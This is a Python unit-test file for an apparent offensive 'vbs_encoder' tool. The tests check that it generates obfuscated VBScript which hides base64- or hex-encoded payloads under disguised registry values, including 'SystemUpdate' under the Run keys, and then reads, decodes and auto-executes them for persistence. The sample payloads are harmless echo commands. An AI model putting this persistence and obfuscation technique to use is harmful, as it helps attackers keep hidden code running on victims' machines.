#!/usr/bin/env python3
"""
Test suite for registry storage functionality in vbs_encoder.py
Tests payload storage in HKLM and HKCU registry locations
"""

import unittest
from vbs_encoder import (
    VBSEncoder, ObfuscationConfig,
    write_payload_to_registry, create_registry_retriever,
    validate_registry_path, validate_registry_hive
)


class TestRegistryStorage(unittest.TestCase):
    """Test registry storage functionality"""

    def setUp(self):
        """Set up test fixtures"""
        self.encoder = VBSEncoder()
        self.test_payload = "powershell.exe -Command \"Write-Host 'Test'\""

    def test_registry_storage_hkcu_base64(self):
        """Test storing payload in HKCU with base64 encoding"""
        vbs_code = self.encoder.create_registry_storage_vbs(
            self.test_payload,
            registry_hive="HKCU",
            registry_path="Software\\Microsoft\\Windows",
            value_name="TestValue",
            encoding="base64"
        )

        # Verify generated code contains expected elements
        self.assertIn("HKEY_CURRENT_USER", vbs_code)
        self.assertIn("RegWrite", vbs_code)
        self.assertIn("Software\\Microsoft\\Windows", vbs_code)
        self.assertIn("TestValue", vbs_code)
        self.assertIn("REG_SZ", vbs_code)

    def test_registry_storage_hklm_hex(self):
        """Test storing payload in HKLM with hex encoding"""
        vbs_code = self.encoder.create_registry_storage_vbs(
            self.test_payload,
            registry_hive="HKLM",
            registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            value_name="SystemUpdate",
            encoding="hex"
        )

        # Verify generated code contains expected elements
        self.assertIn("HKEY_LOCAL_MACHINE", vbs_code)
        self.assertIn("RegWrite", vbs_code)
        self.assertIn("SystemUpdate", vbs_code)
        # Hex encoding should be stored (hex digits like 70, 6f, etc.)
        self.assertIn("706f", vbs_code)  # "po" in hex

    def test_registry_retrieval_base64(self):
        """Test retrieving payload from registry with base64 decoding"""
        vbs_code = self.encoder.create_registry_retrieval_and_execute_vbs(
            registry_hive="HKCU",
            registry_path="Software\\Microsoft\\Windows",
            value_name="TestValue",
            encoding="base64",
            auto_execute=True
        )

        # Verify generated code contains expected elements
        self.assertIn("RegRead", vbs_code)
        self.assertIn("HKEY_CURRENT_USER", vbs_code)
        self.assertIn("MSXML2.DOMDocument", vbs_code)
        self.assertIn("Run", vbs_code)  # Should execute

    def test_registry_retrieval_hex_no_execute(self):
        """Test retrieving payload from registry without execution"""
        vbs_code = self.encoder.create_registry_retrieval_and_execute_vbs(
            registry_hive="HKCU",
            registry_path="Software\\Test",
            value_name="MyValue",
            encoding="hex",
            auto_execute=False
        )

        # Verify generated code
        self.assertIn("RegRead", vbs_code)
        self.assertIn("DecodeHex", vbs_code)
        # Should not contain execution code
        self.assertNotIn(".Run decoded", vbs_code)

    def test_registry_persistence_payload(self):
        """Test creating complete persistence payload"""
        vbs_code = self.encoder.create_registry_persistence_payload(
            self.test_payload,
            registry_hive="HKCU",
            registry_path="Software\\Microsoft\\Windows",
            value_name="Update",
            encoding="base64"
        )

        # Should contain both storage and retrieval
        self.assertIn("RegWrite", vbs_code)
        self.assertIn("RegRead", vbs_code)
        self.assertIn("HKEY_CURRENT_USER", vbs_code)

    def test_write_payload_to_registry_storage_only(self):
        """Test write_payload_to_registry function for storage only"""
        vbs_code = write_payload_to_registry(
            self.test_payload,
            registry_hive="HKCU",
            registry_path="Software\\Test",
            value_name="TestKey",
            encoding="base64",
            retrieve_and_execute=False
        )

        self.assertIn("RegWrite", vbs_code)
        self.assertNotIn("RegRead", vbs_code)

    def test_write_payload_to_registry_with_persistence(self):
        """Test write_payload_to_registry function with persistence"""
        vbs_code = write_payload_to_registry(
            self.test_payload,
            registry_hive="HKLM",
            registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            value_name="SystemMaint",
            encoding="hex",
            retrieve_and_execute=True
        )

        self.assertIn("RegWrite", vbs_code)
        self.assertIn("RegRead", vbs_code)

    def test_create_registry_retriever(self):
        """Test create_registry_retriever function"""
        vbs_code = create_registry_retriever(
            registry_hive="HKCU",
            registry_path="Software\\Test",
            value_name="MyKey",
            encoding="base64",
            auto_execute=True
        )

        self.assertIn("RegRead", vbs_code)
        self.assertIn("Run", vbs_code)

    def test_validate_registry_path_valid(self):
        """Test validation of valid registry paths"""
        valid_paths = [
            "Software\\Microsoft\\Windows",
            "Software\\Test",
            "SYSTEM\\CurrentControlSet\\Services",
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        ]

        for path in valid_paths:
            self.assertTrue(validate_registry_path(path),
                          f"Path should be valid: {path}")

    def test_validate_registry_path_invalid(self):
        """Test validation of invalid registry paths"""
        invalid_paths = [
            "",
            "Software/Microsoft/Windows",  # Forward slash
            None,
        ]

        for path in invalid_paths:
            self.assertFalse(validate_registry_path(path),
                           f"Path should be invalid: {path}")

    def test_validate_registry_hive_valid(self):
        """Test validation of valid registry hives"""
        valid_hives = [
            "HKCU",
            "HKLM",
            "hkcu",  # Case insensitive
            "hklm",
            "HKEY_CURRENT_USER",
            "HKEY_LOCAL_MACHINE"
        ]

        for hive in valid_hives:
            self.assertTrue(validate_registry_hive(hive),
                          f"Hive should be valid: {hive}")

    def test_validate_registry_hive_invalid(self):
        """Test validation of invalid registry hives"""
        invalid_hives = [
            "HKCC",
            "HKEY_USERS",
            "INVALID",
            ""
        ]

        for hive in invalid_hives:
            self.assertFalse(validate_registry_hive(hive),
                           f"Hive should be invalid: {hive}")

    def test_registry_storage_encoding_base64(self):
        """Test that base64 encoding is used correctly in storage"""
        vbs_code = self.encoder.create_registry_storage_vbs(
            "test",
            encoding="base64"
        )
        # Base64 encoded "test" is "dGVzdA=="
        self.assertIn("dGVzdA==", vbs_code)

    def test_registry_storage_encoding_hex(self):
        """Test that hex encoding is used correctly in storage"""
        vbs_code = self.encoder.create_registry_storage_vbs(
            "test",
            encoding="hex"
        )
        # Hex encoded "test" is "74657374"
        self.assertIn("74657374", vbs_code)

    def test_registry_path_concatenation(self):
        """Test that registry paths are correctly concatenated"""
        vbs_code = self.encoder.create_registry_storage_vbs(
            self.test_payload,
            registry_hive="HKCU",
            registry_path="Software\\Test\\Path",
            value_name="ValueName"
        )

        # Should have proper backslash concatenation
        self.assertIn("Software\\Test\\Path", vbs_code)
        self.assertIn("ValueName", vbs_code)

    def test_error_handling_in_retrieval(self):
        """Test that retrieval code includes error handling"""
        vbs_code = self.encoder.create_registry_retrieval_and_execute_vbs()

        self.assertIn("On Error Resume Next", vbs_code)
        self.assertIn("On Error GoTo 0", vbs_code)

    def test_multiple_instances_independent_names(self):
        """Test that multiple encoder instances generate independent names"""
        encoder1 = VBSEncoder()
        encoder2 = VBSEncoder()

        vbs1 = encoder1.create_registry_storage_vbs("test")
        vbs2 = encoder2.create_registry_storage_vbs("test")

        # Both should be valid VBS but variable names may differ
        self.assertIn("RegWrite", vbs1)
        self.assertIn("RegWrite", vbs2)

    def test_long_payload_storage(self):
        """Test storing long payloads in registry"""
        long_payload = "powershell.exe " + "x" * 1000
        vbs_code = self.encoder.create_registry_storage_vbs(
            long_payload,
            encoding="base64"
        )

        self.assertIn("RegWrite", vbs_code)
        # Base64 of long string should be present
        self.assertGreater(len(vbs_code), 100)

    def test_special_characters_in_value_name(self):
        """Test handling of value names with special characters"""
        vbs_code = self.encoder.create_registry_storage_vbs(
            "test",
            value_name="System_Update-Key"
        )

        self.assertIn("System_Update-Key", vbs_code)

    def test_registry_code_structure(self):
        """Test overall structure of generated registry code"""
        vbs_code = self.encoder.create_registry_storage_vbs("test")

        # Should have proper VBS structure
        self.assertIn("CreateObject", vbs_code)
        self.assertIn("WScript.Shell", vbs_code)
        self.assertIn("Set", vbs_code)
        self.assertIn("Dim", vbs_code)


class TestRegistryPersistence(unittest.TestCase):
    """Test registry-based persistence scenarios"""

    def setUp(self):
        """Set up test fixtures"""
        self.encoder = VBSEncoder()

    def test_run_key_persistence_hklm(self):
        """Test persistence via Run key in HKLM"""
        vbs_code = self.encoder.create_registry_storage_vbs(
            "cmd.exe /c echo test",
            registry_hive="HKLM",
            registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            value_name="SystemService"
        )

        self.assertIn("HKEY_LOCAL_MACHINE", vbs_code)
        self.assertIn("Software\\Microsoft\\Windows\\CurrentVersion\\Run", vbs_code)

    def test_run_key_persistence_hkcu(self):
        """Test persistence via Run key in HKCU"""
        vbs_code = self.encoder.create_registry_storage_vbs(
            "powershell.exe -Command Write-Host",
            registry_hive="HKCU",
            registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            value_name="UserService"
        )

        self.assertIn("HKEY_CURRENT_USER", vbs_code)
        self.assertIn("UserService", vbs_code)

    def test_startup_folder_alternative_hkcu(self):
        """Test alternative persistence path in HKCU Startup"""
        vbs_code = self.encoder.create_registry_storage_vbs(
            "test_command",
            registry_hive="HKCU",
            registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
            value_name="Startup"
        )

        self.assertIn("Shell Folders", vbs_code)

    def test_persistence_with_hex_encoding(self):
        """Test persistence with hex encoding for better obfuscation"""
        vbs_code = write_payload_to_registry(
            "malicious_command",
            registry_hive="HKCU",
            registry_path="Software\\Test",
            value_name="HiddenKey",
            encoding="hex",
            retrieve_and_execute=True
        )

        # Should contain both hex encoding and decoding
        self.assertIn("DecodeHex", vbs_code)
        self.assertIn("RegWrite", vbs_code)
        self.assertIn("RegRead", vbs_code)


if __name__ == "__main__":
    unittest.main()
